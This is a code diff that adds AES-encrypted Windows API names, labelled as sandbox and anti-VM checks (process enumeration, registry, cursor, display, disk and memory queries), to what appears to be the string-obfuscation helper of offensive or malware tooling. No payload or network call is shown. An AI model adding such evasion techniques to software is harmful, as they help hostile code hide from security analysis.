@@ -208,6 +208,24 @@ def generate_api_aes_constants() -> list:
         ("CRYPT32_DLL_ENC",        b"crypt32.dll"),
         ("KERNEL32_DLL_ENC",       b"kernel32.dll"),
         ("USER32_DLL_ENC",         b"user32.dll"),
+        # === sandbox / anti-VM APIs ===
+        ("ADVAPI32_DLL_ENC",       b"advapi32.dll"),
+        ("REGOPENKEYEXW_ENC",      b"RegOpenKeyExW"),
+        ("REGCLOSEKEY_ENC",        b"RegCloseKey"),
+        ("GETCURSORPOS_ENC",       b"GetCursorPos"),
+        ("GETFOREGROUNDWINDOW_ENC", b"GetForegroundWindow"),
+        ("ENUMDISPLAYDEVICESW_ENC", b"EnumDisplayDevicesW"),
+        ("CREATETOOLHELP32SNAPSHOT_ENC", b"CreateToolhelp32Snapshot"),
+        ("PROCESS32FIRSTW_ENC",    b"Process32FirstW"),
+        ("PROCESS32NEXTW_ENC",     b"Process32NextW"),
+        ("CLOSEHANDLE_ENC",        b"CloseHandle"),
+        ("OPENPROCESS_ENC",        b"OpenProcess"),
+        ("QUERYFULLPROCESSIMAGENAMEW_ENC", b"QueryFullProcessImageNameW"),
+        ("NTDLL_DLL_ENC",          b"ntdll.dll"),
+        ("NTQUERYSYSTEMINFORMATION_ENC", b"NtQuerySystemInformation"),
+        ("GETDISKFREESPACEEXW_ENC", b"GetDiskFreeSpaceExW"),
+        ("GETVOLUMEINFORMATIONW_ENC", b"GetVolumeInformationW"),
+        ("GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC", b"GetPhysicallyInstalledSystemMemory"),
     ]
     result = []
     for name, plaintext in strings:
